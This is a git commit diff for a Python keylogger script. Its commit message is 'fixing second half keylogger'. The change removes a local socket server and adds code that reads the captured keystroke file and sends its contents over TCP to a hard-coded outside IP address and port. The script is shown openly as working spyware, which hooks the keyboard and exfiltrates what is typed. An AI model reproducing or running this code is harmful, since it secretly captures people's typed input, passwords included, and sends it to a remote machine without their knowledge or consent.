81c89234dcd437e1761052f00a09a18779cbed77
jinruan <jruan6377@bths.edu>
2016-05-08 19:50:40 -0400

    fixing second half keylogger

--- keylogger.py
+++ keylogger.py
@@ -32,31 +32,14 @@ hm.HookKeyboard()
 # wait forever
 pythoncom.PumpMessages()
 
-#=====================================================
+#=============================================
+#sending txt file
 
-port = 60000                    # Reserve a port for your service.
-s = socket.socket()             # Create a socket object
-host = socket.gethostname()     # Get local machine name
-s.bind((host, port))            # Bind to the port
-s.listen(5)                     # Now wait for client connection.
+f = open('keylogtest.txt', 'r')
+strf = str(f.read())
+print(strf)
+eggs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+eggs.connect(('107.170.79.196', 9010))
+eggs.sendall(strf)
 
-print 'Server listening....'
-
-while True:
-    conn, addr = s.accept()     # Establish connection with client.
-    print 'Got connection from', addr
-    data = conn.recv(1024)
-    print('Server received', repr(data))
-
-    filename='c:\output.txt'
-    f = open(filename,'rb')
-    l = f.read(1024)
-    while (l):
-       conn.send(l)
-       print('Sent ',repr(l))
-       l = f.read(1024)
-    f.close()
-
-    print('Done sending')
-    conn.send('Thank you for connecting')
-    conn.close()
+print("done")
